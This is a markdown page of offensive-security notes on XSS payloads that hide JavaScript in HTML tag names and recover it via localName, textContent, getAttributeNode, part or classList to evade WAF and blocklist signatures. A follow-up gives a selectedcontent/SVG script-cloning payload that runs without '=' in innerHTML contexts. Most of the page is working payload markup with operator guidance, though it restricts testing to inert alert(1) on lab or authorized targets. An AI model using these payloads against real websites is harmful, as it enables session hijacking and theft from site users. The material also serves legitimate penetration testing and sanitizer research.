---
title: XSS payload hiding in HTML tag names (WAF bypass)
---

# XSS payload hiding in HTML tag names (WAF bypass)

A browser is far more lenient about what counts as an HTML **tag name** than most blocklists assume. A tag name does not have to be a known element, it just has to begin with a letter, and the DOM exposes lowercase/derived forms of that name through properties that a naïve signature scanner never looks at. This makes the tag name itself a payload-carrier: you can store JavaScript, a URL, or fresh markup *inside the tag name*, recover it at runtime through a property, and hand it to a JS evaluation or DOM sink. The result is a reliable XSS vector that often evades WAF and blocklist signatures because the payload string never appears as a normal `<script>` or `on*` handler in a way the scanner is tuned to catch.

Source technique: PortSwigger Research, "What's in a tag name? JavaScript, apparently" (Gareth Heyes, 2026-08-25).

## Why the trick works

Two facts combine:

1. **Browsers accept almost anything as a tag name.** After the leading alphabetic character, a tag name can contain alphanumerics, `/`, whitespace, and newlines. Line-separator and paragraph-separator characters are *not* transformed and are treated as newlines in JavaScript, so they can split an expression.
2. **The DOM exposes the raw tag name in derived properties.** The canonical one is `localName`, which holds the **lowercased** version of the tag name. Because the browser auto-uppercased the tag, `localName` hands you back a clean lowercase copy of whatever you embedded.

So the payload lives in the tag, and `localName` (or sibling properties) is the retrieval primitive.

## Core primitive (works in every browser)

Make any element focusable, chain `onfocus` onto itself, write the payload string into an attribute value, convert it to a function, and invoke it:

```html
<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>
```

- `tabindex=1` makes the (unknown) element focusable.
- `autofocus` fires `onfocus` immediately.
- `attributes[0].value` is the `onfocus` attribute's own string value, which is set to `localName` (the lowercase tag name = `alert(1)`).
- `new onfocus` coerces that string into a constructor/function and `new onfocus` invokes it.

## WAF / blocklist evasion variants

When a particular token is blocked, rotate the retrieval primitive or the focus mechanism:

**Uppercase JavaScript via `localName`:**

```html
<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>
```

**Alternative attribute-value retrieval** (when `attributes[0].value` is blocked):

```html
<ALERT(1) onfocus="attributes[0].textContent=localName,new onfocus" autofocus tabindex=1>
<ALERT(1) onfocus="attributes[0].nodeValue=localName,new onfocus" autofocus tabindex=1>
```

**`getAttributeNode` retrieval** (forgotten primitive):

```html
<ALERT(1) onfocus="getAttributeNode('onfocus').value=localName,onfocus()" autofocus tabindex=1>
```

**`contenteditable` instead of `tabindex`** to make the element focusable:

```html
<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus contenteditable>
```

**Line-separator characters** (rendered as newlines in JS, evade single-line signatures):

```html
<alert(1) onfocus="attributes.onfocus.value=localName,new onfocus" autofocus tabindex=1>
```

**Opening angle bracket inside the tag name**, combined with the first attribute to produce fresh markup:

```html
<alert<img title=" src onerror=alert(1)> " onfocus=innerHTML=localName+attributes[0].value tabindex=1 autofocus>
```

**`setHTMLUnsafe`** (Svelte-context sink) with the tag name as the source:

```html
<alert<img title=" src onerror=alert(1)> " onfocus=setHTMLUnsafe(localName+title) tabindex=1 autofocus>
```

**`part` attribute array → `eval`** (the `part` attribute converts space-separated values into an array; overwrite the `event`/`onfocus` variables with `Function` and `eval` the payload portion):

```html
<ALERT(1) onfocus="event=localName;part=onfocus,onfocus=Function,eval(part[1])()" tabindex=1 autofocus>
```

**`classList` variant** of the `part` trick:

```html
<ALERT(1) onfocus="event=localName;classList=onfocus,onfocus=Function,eval(classList[1])()" tabindex=1 autofocus>
```

## Where to apply this as an operator

- **Contextual XSS with an active blocklist / WAF.** When a `<script>`, `onerror`, or `javascript:` payload is stripped but the surrounding markup is still reflected, try moving the payload into a tag name and reading it back through `localName` / `textContent` / `nodeValue` / `getAttributeNode`.
- **Strict CSP without a script-src 'unsafe-inline' but with a permissive `eval`/DOM-sink path.** The `part`/`classList` → `Function`/`eval` variants target `eval`-reaching contexts.
- **Frameworks with their own "unsafe HTML" sink** (e.g. Svelte `setHTMLUnsafe`). The tag name is a second, less-scanned input channel to that sink.
- **Fuzz the tag-name character set.** The transformation space is small but concrete: leading letter required; alphanumerics, `/`, whitespace, newlines allowed; case folded to uppercase on the tag and available lowercase via `localName`; line/paragraph separators preserved as JS newlines. Enumerate which characters your target's parser preserves.

## Lab harness (replayable, no external infra)

Minimal single-file check on any local HTML host:

```bash
cat > /tmp/tagname.html <<'HTML'
<!doctype html><html><body>
<h1>probe</h1>
<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>
</body></html>
HTML
python3 -m http.server 8080 --directory /tmp
# open http://127.0.0.1:8080/tagname.html in a browser with devtools open;
# a JS dialog / console eval of alert(1) confirms the primitive fires.
```

Positive result: the browser evaluates `alert(1)` from the tag name without any `<script>` tag or literal `onerror=`. Keep the payload inert (`alert(1)`, `document.title=localName`), never load exfiltration, credential access, or a remote script.

## Safe boundaries

- Prove with `alert(1)` / title-change / console marker only. Do not fetch, exfiltrate, touch cookies, or run a remote payload.
- Test on a lab host or explicitly authorized target with a writable reflection point; do not inject into other users' sessions.
- Do not combine with stored payloads on shared/production systems without explicit engagement scope.

## Reporting heuristics

- Name the exact retrieval primitive used (`localName`, `textContent`, `nodeValue`, `getAttributeNode`, `part`, `classList`) and the focus mechanism (`tabindex`, `contenteditable`, `autofocus`).
- Show the blocklist/WAF that rejected the "normal" form and accepted the tag-name form (control pair).
- Note browser engine coverage (the core primitive is cross-browser per the source; verify per-target engine before claiming).
- Keep the payload inert and the reflection point clearly identified.

## November 18 2026 follow-up: `selectedcontent` clones an SVG script out of a selected option and the clone executes, solving the "innerHTML without equals" impossible lab

PortSwigger Research published guest work by Masato Kinugawa (2026-11-18) that breaks a context on the 2020 "impossible labs" list previously considered unbreakable: **JavaScript execution in an `innerHTML` injection where the equals sign is not allowed**. This page's thesis extends to it: the retrieval-and-reparse trickery that makes tag names a payload carrier has a new sibling primitive, a *browser-native cloning element*.

The payload (works in Safari 27.2 at time of writing; patched in Chrome 153):

```html
<body> <script> document.body.innerHTML=`
<select>
<selectedcontent></selectedcontent>
<option>
<svg>
<script>alert(1)<\/script>`;
</script>
```

Mechanics worth memorizing:

1. **`selectedcontent` is a cloning element.** The new HTML element associated with `<select>` clones the child nodes of the currently selected `<option>` (per spec, the same algorithm as `cloneNode(true)`) directly into the DOM, no JavaScript required. An `<option>` holding `<svg><script>alert(1)` therefore gets its script *copied into the document* at render time.
2. **SVG-namespace scripts escaped the `already started` flag.** Scripts inserted via `innerHTML` never execute because the parser marks them "already started". Chromium applied that flag to HTML-namespace scripts but not SVG-namespace scripts, so an SVG `<script>` that reaches the DOM *via a clone* (cloneNode(true) + append, or `selectedcontent`) executes. Both conditions are required: remove `<svg>` or remove `<selectedcontent>` and nothing fires. Chromium fixed this in Chrome 153 by setting the flag for SVG scripts too; Safari 27.2 still executes.
3. **The character-free battery.** With Mathias Karlsson, Kinugawa reduced the vector to run without whitespace, without `/`, and without `=`: `<select><button><selectedcontent><button><option><svg><script>alert(1)`. The `<svg>` wrapper also makes the HTML parser interpret a following `<foo>` as a start tag, so real page content after the payload does not get swallowed into the script body and break syntax. To the author's knowledge no prior vector executes JS in modern browsers without whitespace, `/`, or `=`.
4. **Genealogy.** The technique originates from Kabir Acharya's May 2026 DOMPurify bypass, which first weaponized `selectedcontent`; see the reparse-legs table on the [July 23 DOMPurify state page](../alerts/2026-07-23-dompurify-state-context-boundaries-ghsa.md).

Operator rules:

- **A sanitizer verdict on option content is not a verdict on the clone.** If the target sanitizes then assigns to `innerHTML` and the allowlist tolerates `select`/`option`/`button`/`svg` (common for rich content), the clone happens *after* sanitization, at render time, inside the browser. Prove with an inert `alert(1)` on your own fixture page; diff pre/post-sanitizer serialized output plus clone execution.
- **Re-ask the impossible question whenever browsers ship new elements.** Every new Chrome/Safari element (select-part being the current example) is a candidate primitive against every "this context cannot execute JS" assumption you hold. The impossible-labs list is a to-do list, not a closed book.
- **Fingerprint the two-condition shape before claiming:** (1) a script element created in the SVG namespace via `innerHTML`, and (2) a clone pathway (`selectedcontent` or an app-side `cloneNode(true)` + append of sanitized HTML). Also record the browser engine and version: Chrome >= 153 is closed for the plain vector, Safari 27.2 is open, and enterprise targets often pin old Chromium.
- Payload hiding composes with this page's tag-name channel when a WAF blocks the obvious token set: `=` is exactly what WAF XSS signatures anchor on, and this vector never uses one.

Lab harness: local fixture page running the payload above in Safari 27.2 (or a pinned Chromium < 153 build), inert `alert(1)` only. Negative controls: drop `<svg>` or drop `<selectedcontent>` and confirm no execution.

## Sources

- [PortSwigger Research: What's in a tag name? JavaScript, apparently](https://portswigger.net/research/whats-in-a-tag-name-javascript-apparently) (Gareth Heyes, 2026-08-25)
- [PortSwigger Research: Achieving the impossible: XSS in innerHTML without equals](https://portswigger.net/research/achieving-the-impossible-xss-in-innerhtml-without-equals) (Masato Kinugawa, guest post, 2026-11-18)
